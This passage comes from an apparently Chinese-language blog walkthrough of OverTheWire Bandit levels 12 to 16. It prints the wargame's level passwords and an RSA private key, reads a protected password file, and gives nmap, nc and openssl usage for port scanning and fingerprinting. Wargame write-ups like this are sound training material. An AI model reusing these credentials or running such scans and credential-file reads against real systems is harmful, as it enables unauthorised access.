ls</span><br><span class="line">bobo.gz  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d bobo.gz </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file b</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.bz2</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ bzip2 -d bobo.bz2 </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: gzip compressed data, was &quot;data4.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d bobo.gz </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf bobo</span><br><span class="line">data5.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data5.bin </span><br><span class="line">data5.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf data5.bin</span><br><span class="line">data6.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data6.bin </span><br><span class="line">data6.bin: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv data6.bin data6.bz2</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ bzip2 -d data6.bz2 </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data6</span><br><span class="line">data6: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf data6</span><br><span class="line">data8.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data8.bin </span><br><span class="line">data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data8.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv data8.bin data8.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d data8.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data8  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data8</span><br><span class="line">data8: ASCII text</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ cat data8</span><br><span class="line">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br></pre></td></tr></table></figure><br>这个题，我真的服了。。。我都怀疑自己是不是做错了。。。给出题人打call</p><h2 id="bandit-13-14"><a href="#bandit-13-14" class="headerlink" title="bandit 13-14"></a>bandit 13-14</h2><p>Level Goal<br>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这一关主要就是要让我们使用私钥文件去登陆bandit14用户然后查看密码通往下一关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bandit13@bandit:~$ ls</span><br><span class="line">sshkey.private</span><br><span class="line">bandit13@bandit:~$ strings sshkey.private </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+</span><br><span class="line">gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB</span><br><span class="line">ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb</span><br><span class="line">ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV</span><br><span class="line">ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7</span><br><span class="line">jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA</span><br><span class="line">J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE</span><br><span class="line">pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67</span><br><span class="line">xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS</span><br><span class="line">nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD</span><br><span class="line">o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe</span><br><span class="line">ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf</span><br><span class="line">laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS</span><br><span class="line">M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU</span><br><span class="line">1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH</span><br><span class="line">PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s</span><br><span class="line">8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+</span><br><span class="line">xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1</span><br><span class="line">GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J</span><br><span class="line">3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY</span><br><span class="line">iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby</span><br><span class="line">9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD</span><br><span class="line">qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0</span><br><span class="line">kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN</span><br><span class="line">/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><br>这是我们得到的私钥<br>这里我们会用ssh -i 是密钥登陆<br>ssh -i /path/to/kp-1234abcd [user@]hostname<br>// -i 指明 identity_file。无参运行 ssh 可看帮助。<br>我们登陆到bandit14后ls -s发现没有有用的东西，看到题目提示：下一级别的密码存储在 / etc / bandit_pass / bandit14中<br>直接cat 试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure></p><h2 id="bandit-14-15"><a href="#bandit-14-15" class="headerlink" title="bandit 14-15"></a>bandit 14-15</h2><p>Level Goal<br>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这一关的意思是让我们本地登陆30000端口发送上一关密码，应该会得到下一关密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">想要连接到某处: nc [-options] hostname port[s] [ports] …</span><br><span class="line">绑定端口等待连接: nc -l port [-options] [hostname] [port]</span><br><span class="line"></span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;</span><br><span class="line">-h：在线帮助;</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;</span><br><span class="line">-l：使用监听模式，监控传入的资料;</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器;</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口;</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择;</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;</span><br><span class="line">-u：使用UDP传输协议;</span><br><span class="line">-v：显示指令执行过程;</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间;</span><br><span class="line">-z：使用0输入/输出模式，只在扫描通信端口时使用。</span><br><span class="line">用法：</span><br><span class="line">[A Server(192.168.1.1) B Client(192.168.1.2)]</span><br><span class="line">连接到远程主机:</span><br><span class="line">$nc -nvv 192.168.x.x 80</span><br><span class="line">连到192.168.x.x的TCP80端口.</span><br><span class="line">监听本地主机:</span><br><span class="line">$nc -l 80</span><br></pre></td></tr></table></figure><br>我们输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">Correct!</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure></p><h2 id="bandit-15-16"><a href="#bandit-15-16" class="headerlink" title="bandit 15-16"></a>bandit 15-16</h2><p>Level Goal<br>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.<br>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这里我们要用到s_client命令，下面介绍一下用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">s_client为一个SSL/TLS客户端程序，与s_server对应，它不仅能与s_server进行通信，也能与任何使用ssl协议的其他服务程序进行通信.</span><br><span class="line">openssl s_client [-host host] [-port port] [-connect host:port] [-verify depth] [-cert filename] [-certform DER|PEM] [-key filename] [-keyform DER|PEM] [-pass arg] [-CApath directory] [-CAfile filename] [-reconnect][-pause] [-showcerts] [-debug] [-msg] [-state] [-nbio_test] [-nbio][-crlf] [-ign_eof] [-no_ign_eof] [-quiet] [-ssl2] [-ssl3] [-tls1_1] [-tls1_2] [-tls1] [-dtls1] [-no_ssl2][-no_ssl3] [-no_tls1] [-no_tls1_1] [-no_tls1_2] [-bugs] [-cipher cipherlist] [-starttls protocol] [-engine id] [-tlsextdebug] [-no_ticket] [-sess_out filename] [-sess_in filename] [-rand file(s)]</span><br><span class="line">-host host     - use -connect instead</span><br><span class="line"> -port port     - use -connect instead</span><br><span class="line"> -connect host:port - who to connect to (default is localhost:4433)</span><br><span class="line"> -verify arg   - turn on peer certificate verification</span><br><span class="line"> -cert arg     - certificate file to use, PEM format assumed</span><br><span class="line"> -certform arg - certificate format (PEM or DER) PEM default</span><br><span class="line"> -key arg      - Private key file to use, in cert file if</span><br><span class="line">                 not specified but cert file is.</span><br><span class="line"> -keyform arg  - key format (PEM or DER) PEM default</span><br><span class="line"> -pass arg     - private key file pass phrase source</span><br><span class="line"> -CApath arg   - PEM format directory of CA&apos;s</span><br><span class="line"> -CAfile arg   - PEM format file of CA&apos;s</span><br><span class="line"> -trusted_first - Use trusted CA&apos;s first when building the trust chain</span><br><span class="line"> -reconnect    - Drop and re-make the connection with the same Session-ID</span><br><span class="line"> -pause        - sleep(1) after each read(2) and write(2) system call</span><br><span class="line"> -showcerts    - show all certificates in the chain</span><br><span class="line"> -debug        - extra output</span><br><span class="line"> -msg          - Show protocol messages</span><br><span class="line"> -nbio_test    - more ssl protocol testing</span><br><span class="line"> -state        - print the &apos;ssl&apos; states</span><br><span class="line"> -nbio         - Run with non-blocking IO</span><br><span class="line"> -crlf         - convert LF from terminal into CRLF</span><br><span class="line"> -quiet        - no s_client output</span><br><span class="line"> -ign_eof      - ignore input eof (default when -quiet)</span><br><span class="line"> -no_ign_eof   - don&apos;t ignore input eof</span><br><span class="line"> -psk_identity arg - PSK identity</span><br><span class="line"> -psk arg      - PSK in hex (without 0x)</span><br><span class="line"> -ssl2         - just use SSLv2</span><br><span class="line"> -ssl3         - just use SSLv3</span><br><span class="line"> -tls1_2       - just use TLSv1.2</span><br><span class="line"> -tls1_1       - just use TLSv1.1</span><br><span class="line"> -tls1         - just use TLSv1</span><br><span class="line"> -dtls1        - just use DTLSv1</span><br><span class="line"> -mtu          - set the link layer MTU</span><br><span class="line"> -no_tls1_2/-no_tls1_1/-no_tls1/-no_ssl3/-no_ssl2 - turn off that protocol</span><br><span class="line"> -bugs         - Switch on all SSL implementation bug workarounds</span><br><span class="line"> -serverpref   - Use server&apos;s cipher preferences (only SSLv2)</span><br><span class="line"> -cipher       - preferred cipher to use, use the &apos;openssl ciphers&apos;</span><br><span class="line">                 command to see what is available</span><br><span class="line"> -starttls prot - use the STARTTLS command before starting TLS</span><br><span class="line">                 for those protocols that support it, where</span><br><span class="line">                 &apos;prot&apos; defines which one to assume.  Currently,</span><br><span class="line">                 only &quot;smtp&quot;, &quot;pop3&quot;, &quot;imap&quot;, &quot;ftp&quot; and &quot;xmpp&quot;</span><br><span class="line">                 are supported.</span><br><span class="line"> -engine id    - Initialise and use the specified engine</span><br><span class="line"> -rand file:file:...</span><br><span class="line"> -sess_out arg - file to write SSL session to</span><br><span class="line"> -sess_in arg  - file to read SSL session from</span><br><span class="line"> -servername host  - Set TLS extension servername in ClientHello</span><br><span class="line"> -tlsextdebug      - hex dump of all TLS extensions received</span><br><span class="line"> -status           - request certificate status from server</span><br><span class="line"> -no_ticket        - disable use of RFC4507bis session tickets</span><br><span class="line"> -nextprotoneg arg - enable NPN extension, considering named protocols supported (comma-separated list)</span><br><span class="line"> -legacy_renegotiation - enable use of legacy renegotiation (dangerous)</span><br><span class="line"> -use_srtp profiles - Offer SRTP key management with a colon-separated profile list</span><br><span class="line"> -keymatexport label   - Export keying material using label</span><br><span class="line"> -keymatexportlen len  - Export len bytes of keying material (default 20)</span><br></pre></td></tr></table></figure><br>我们开始做题<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">bandit15@bandit:~$ openssl s_client -connect localhost:30001</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEBuAgAjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMTgxMDE2MTIwMzI3WhcNMTkxMDE2MTIwMzI3WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMAzS7Wa</span><br><span class="line">lf+m6OTRah6FDYL0q/DxznPWB4sF5gs5IQwtGO4SqNODkhck/xz1EvJK+rSpAx0H</span><br><span class="line">qRWS6n12gs0xt0amU+krwitJ1XeZ4IZGpd5EwTMU7+AR0KO6Z9Xvmfs4TsOFvfHF</span><br><span class="line">vBMYM04V3/O6P+/DBtD75nYLrflqLwVLDwo1AgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAF+BtyNMesHZTXXKxhJhv7e4WYMcFGPiUlhM/O8DGRuA4UoMeXpO</span><br><span class="line">iSocOtYnOcDiOGzJmFWAwMFz6qAUSwb0lkKpbY2kNJHJ6jmSI2j+houZmVLUgvQr</span><br><span class="line">vCoD6KL5krLQ9JFjIhyBzIVq2C3HV15N0miFFBTVOI/6FC/TTEeZZxzB</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has read 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 8811BE3C2A33A03BD25B2A509F5827D0EA33984E87067C9495ED1AD12AA762F7</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 17866C85119DB2C4F4818F42CE515CCCA96E06C60DEB36E53A715448E221E652B9DF2BE0BA00DBA1CF586ABC2569867B</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 4d 71 e2 4a 89 ec b5 87-ae 3b 55 9c 1b 55 0b bc   Mq.J.....;U..U..</span><br><span class="line">    0010 - bb b1 e9 26 7c ab 39 d0-27 a4 12 11 02 a9 da 4a   ...&amp;|.9.&apos;......J</span><br><span class="line">    0020 - d0 9a c6 9b e3 9f 14 f3-4c 0c 02 76 d5 35 21 0d   ........L..v.5!.</span><br><span class="line">    0030 - 7c 9f f3 7b a3 be 1d a9-68 d3 ee 8e 4c a0 7c 88   |..&#123;....h...L.|.</span><br><span class="line">    0040 - 08 09 a2 c5 2d 5e b4 3c-d0 cd 4b 42 16 cd 7b 3f   ....-^.&lt;..KB..&#123;?</span><br><span class="line">    0050 - b6 bf d3 ca 86 4e b5 e9-7b cf 20 99 a9 ab 2e 65   .....N..&#123;. ....e</span><br><span class="line">    0060 - 70 7c be 14 4d 61 21 4d-49 ea 37 56 3e d8 e0 6d   p|..Ma!MI.7V&gt;..m</span><br><span class="line">    0070 - cb 50 e7 8b 5b df 80 14-a3 ac a0 13 26 73 03 09   .P..[.......&amp;s..</span><br><span class="line">    0080 - 96 bd ef b8 e4 7d a9 0a-49 e7 46 54 3f 82 c9 e0   .....&#125;..I.FT?...</span><br><span class="line">    0090 - ef 52 13 48 bd 2c 66 be-56 5e a9 50 16 08 12 6d   .R.H.,f.V^.P...m</span><br><span class="line">    Start Time: 1540907808</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify return code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br><span class="line">Correct!</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">closed</span><br></pre></td></tr></table></figure></p><h2 id="bandit-16-17"><a href="#bandit-16-17" class="headerlink" title="bandit 16-17"></a>bandit 16-17</h2><p>Level Goal<br>The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>需要我们扫描一下在31000-32000端口开放的服务，其中一个我们提交上一关答案就会告诉我们下一关答案、<br>nmap命令详细介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.**.0/24    扫描目标IP段，查看有哪些IP存活</span><br><span class="line">nmap 192.168.**.1-100     扫描从192.168.**.1-192.168.**.100有哪些IP存活</span><br><span class="line">nmap -iL ip_addr     扫描文件ip_addr文件中所存储的IP地址有哪些存活，并扫描存活IP主机所打开的端口（需要创建ip_addr文件，并将预扫描IP写入 ip_addr文件中。创建文件：touch ip_addr写入扫描的eth0网卡：eth0 &quot;192.168.**.1 192.168.**.2&quot;&gt; ip_addr）</span><br><span class="line">nmap -p0-65535 192.168.**.1    扫描目标主机的所有端口（端口号从0-65535）</span><br><span class="line">nmap -p21,22,80,3389 192.168.**.1    扫描目标主机的部分端口</span><br><span class="line">nmap -O 192.168.**.1    扫描识别目标主机的系统（可以识别系统内核，但有时不能精确识别系统）</span><br></pre></td></tr></table></figure><br>开始扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ nmap localhost -p 31000-32000</span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2018-10-30 15:26 CET</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31518/tcp open  unknown</span><br><span class="line">31790/tcp open  unknown</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</span><br></pre></td></tr></table></figure><br>我们看到31518和31790都是开着的，我们一个一个服务去试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">首先：openssl s_client -connect localhost:31518</span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31518</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify return:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify return:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   